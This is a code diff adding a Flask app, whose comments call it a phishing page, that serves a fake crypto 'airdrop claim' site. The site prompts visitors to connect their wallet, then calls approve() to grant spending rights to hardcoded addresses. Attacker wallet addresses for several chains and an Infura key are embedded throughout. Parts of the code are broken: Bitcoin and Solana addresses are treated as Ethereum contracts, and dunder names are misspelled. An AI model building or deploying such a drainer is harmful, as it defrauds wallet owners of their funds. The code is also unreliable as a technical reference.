@@ -1,0 +1,99 @@
+from flask import Flask, request, render_template_string, jsonify
+‎from web3 import Web3
+‎from solcx import compile_standard
+‎import json 
+‎from bitcoinlib.transactions import Transaction
+‎
+‎app = Flask(_name_)
+‎
+‎# Connect to Ethereum and BNB nodes
+‎eth_web3 = Web3(Web3.HTTPProvider('https://mainnet.infura.io/v3/83caa57ba3004ffa91addb7094bac4cc'))
+‎bnb_web3 = Web3(Web3.HTTPProvider('https://bsc-dataseed.binance.org/'))
+‎
+‎# Your wallet addresses
+‎YOUR_ETH_ADDRESS = '0x896593277E72463232b54Aa0d31679b0Ff297C5e'
+‎YOUR_BNB_ADDRESS = '0x896593277E72463232b54Aa0d31679b0Ff297C5e'
+‎YOUR_SOLANA_ADDRESS = 'ErLtZyQ36HW9HjFUtmpwcbjeBoUxcUA6VxwFJA1vfqMv'
+‎YOUR_BTC_ADDRESS = 'bc1qzhtlm0f270l5stm6snaj7yek05yjx6s9eg9f8w'
+‎YOUR_POLYGON_ADDRESS = '0x896593277E72463232b54Aa0d31679b0Ff297C5e'
+‎
+‎# Solana connection
+‎from solana.rpc.api import Client
+‎from solana.publickey import PublicKey
+‎from solana.transaction import Transaction
+‎from solana.system_program import TransferParams, transfer
+‎from solana.rpc.types import TxOpts
+‎from solana.rpc.websocket_api import connect, subscribe
+‎
+‎solana_client = Client("https://api.mainnet-beta.solana.com")
+‎YOUR_SOLANA_PUBLIC_KEY = PublicKey('ErLtZyQ36HW9HjFUtmpwcbjeBoUxcUA6VxwFJA1vfqMv')
+‎
+‎# HTML template for the phishing page
+‎PHISHING_PAGE = f"""
+‎<!doctype html>
+‎<html>
+‎ <head>
+‎ <title>Airdrop Claim</title>
+‎ <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="text/javascript"></script>
+‎ <script src="https://cdn.jsdelivr.net/gh/solana-labs/wallet-adapter@main/dist/index.iife.min.js"></script>
+‎ </head>
+‎ <body>
+‎ <h2>Claim Your Airdrop!</h2>
+‎ <p>Connect your wallet and agree to the terms and conditions to claim your airdrop.</p>
+‎ <button id="connectButton">Connect Wallet and Agree</button>
+‎ <script>
+‎ document.getElementById('connectButton').onclick = async () => {{
+‎ const provider = new ethers.providers.Web3Provider(window.ethereum);
+‎ await provider.send("eth_requestAccounts", []);
+‎ const signer = provider.getSigner();
+‎ const address = await signer.getAddress();
+‎ const contract = new ethers.Contract('{'0x896593277E72463232b54Aa0d31679b0Ff297C5e'}', [{ "constant": false, "inputs": [{{ "name": "spender", "type": "address" }}], "name": "approve", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }], signer);
+‎ try {{
+‎ await contract.approve('{'0x896593277E72463232b54Aa0d31679b0Ff297C5e'}');
+‎ alert('Airdrop claimed successfully!');
+‎ }} catch (error) {{
+‎ console.error('Error approving contract:', error);
+‎ alert('Failed to claim airdrop. Please try again.');
+‎ }}
+‎ };
+‎ </script>
+‎ <script>
+‎ // Solana connection
+‎ const solanaProvider = new WalletAdapter();
+‎ await solanaProvider.connect();
+‎ const solanaAddress = solanaProvider.publicKey.toString();
+‎ const solanaContract = new ethers.Contract('{'ErLtZyQ36HW9HjFUtmpwcbjeBoUxcUA6VxwFJA1vfqMv'}', [{ "constant": false, "inputs": [{{ "name": "spender", "type": "address" }}], "name": "approve", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }], solanaProvider);
+‎ try {{
+‎ await solanaContract.approve('{'ErLtZyQ36HW9HjFUtmpwcbjeBoUxcUA6VxwFJA1vfqMv'}');
+‎ alert('Airdrop claimed successfully!');
+‎ }} catch (error) {{
+‎ console.error('Error approving contract:', error);
+‎ alert('Failed to claim airdrop. Please try again.');
+‎ }}
+‎ </script>
+‎ <script>
+‎ // Bitcoin connection
+‎ const btcProvider = new ethers.providers.Web3Provider(window.bitcoin);
+‎ await btcProvider.send("eth_requestAccounts", []);
+‎ const btcSigner = btcProvider.getSigner();
+‎ const btcAddress = await btcSigner.getAddress();
+‎ const btcContract = new ethers.Contract('{'bc1qzhtlm0f270l5stm6snaj7yek05yjx6s9eg9f8w'}', [{ "constant": false, "inputs": [{{ "name": "spender", "type": "address" }}], "name": "approve", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }], btcSigner);
+‎ try {{
+‎ await btcContract.approve('{'bc1qzhtlm0f270l5stm6snaj7yek05yjx6s9eg9f8w'}');
+‎ alert('Airdrop claimed successfully!');
+‎ }} catch (error) {{
+‎ console.error('Error approving contract:', error);
+‎ alert('Failed to claim airdrop. Please try again.');
+‎ }}
+‎ </script>
+‎ </body>
+‎</html>
+‎"""
+‎
+‎# Route to display the phishing page
+‎@app.route('/')
+‎def index():
+‎ return render_template_string(PHISHING_PAGE)
+‎
+‎if _name_ == '_main_':
+‎ app.run(host='0.0.0.0', port=5000)
